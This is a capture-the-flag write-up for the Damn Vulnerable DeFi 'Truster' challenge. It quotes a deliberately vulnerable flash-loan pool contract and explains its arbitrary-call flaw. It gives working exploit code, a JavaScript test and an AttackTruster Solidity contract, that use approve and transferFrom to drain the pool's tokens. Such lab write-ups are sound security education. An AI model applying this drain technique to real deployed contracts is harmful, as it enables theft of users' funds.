## 1) Challenge

> <cite>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. </cite>
> <cite>Currently the pool has 1 million DVT tokens in balance. And you have nothing. </cite>
> <cite>But don't worry, you might be able to take them all from the pool. In a single transaction. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/3.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

Let's start by analyzing how the flash loads are provided.
`TrusterLenderPool` contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/truster/TrusterLenderPool.sol)).

```solidity

contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

```

The `flashLoan` function:
- checks if the token balance is `>=` the amount we want to borrow (line `33`)
- transfers the borrowed amount to the borrower
- calls `functionCall` from the `Address` library on a target address by providing data bytes as a parameter (line `36`). `flashLoan` expects that `functionCall` will call another function contract that will be responsible for paying back the flash loan
- checks the amount is paid back (line `39`)

Our goal is to take all the `1 million DVT` from the pool.

#### What happens when we call `functionCall`?

When calling `functionCall`, the `msg.sender` will be the pool contract. Also, since we can control the target address and the data to be sent (`target` and `data` parameters, respectively), we can call any function on any contract and have the `msg.sender` as the pool contract.

#### How can we make the pool send us all the DVT tokens?

We can use the pool to call any contract function, which means we can also call functions on the DVT token itself. For example, we can call `transfer` from the ERC-20 token (the `target` address) and sends all its balance to our contract/address.
Unfortunately, the function will fail because the condition at line `39` will be false (the `balacenceAfter` will be less that the original balance) :sob:.


Remember challenge 1 (if not here is the [link](DamnVulnerableDeFi_01_unstoppable.md))? `transfer` is not the only function to transfer tokens, there is also `transferFrom`. However, before calling `transferFrom`, we need to first `approve` the spender to spend the caller tokens. 

In order to get all the tokens from the pool, we can call the `flashLoan` function with the following parameters:
- set the `borrowAmount` equal `0` (there are no checks on the `borrowAmount`), so there will be no token transfer and all the `require` in the function will be satisfied
- set the `borrower` to be the attacker contract
- set the `target` address to be the DVT address, so that the pool will call its `approve` function
- set the `data` to be the encoding of the `approve` function with `target` address set to the attacker address and the `amount` to be the pool balance

Finally, since we have have been approved by the pool to spend all its token, we can call the `transferFrom` and transfer all the token's pool to us.

## 3) Solution
Like the previous challenge, this one can be solved in multiple ways.

### 3.1) Solution 1: multiple transactions

We can implement the above steps by executing `2` transactions: one for calling the `flashLoan` and one for `transferFrom`.

`truster.challenge.js`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        const iface = new ethers.utils.Interface([
            "function approve(address spender, uint256 amount)",
        ]);
        let approve = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
        await this.pool.connect(attacker).flashLoan(
            0,                  
            attacker.address,   
            this.token.address, 
            approve             
        )
        
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);

    });


```

### 3.2) Solution 2: single transaction

The same solution can be executed in a single transaction by using an attack contract. In this case we will first approve our contract to spend the pool tokens and then we will transfer them to our address.

`AttackTruster.sol`
```solidity

// SPDX-License-Identifier: MIT
// ...
/**
 * @title AttackTruster
 */

contract AttackTruster {
  
    IPool pool;
    IDamnValuableToken token;
    address attacker;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IDamnValuableToken(_token);
        attacker = msg.sender;
    }

    function run() public {

      uint256 amount = token.balanceOf(address(pool));

      uint256 borrowAmount = 0;
      address borrower = attacker;
      address target = address(token);
      bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

      pool.flashLoan(borrowAmount, borrower, target, data);

      token.transferFrom(address(pool), borrower, amount);

    }

}

```

`truster.challenge.js`:

```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */


        // single transaction
        const attack = await (await ethers.getContractFactory('AttackTruster', attacker)).deploy(this.pool.address, this.token.address);
        await attack.run();
        
    });


```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/truster/truster.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackTruster.sol).


## 4) References

- [Address functionCall](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-)
- [approve](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-approve-address-uint256-)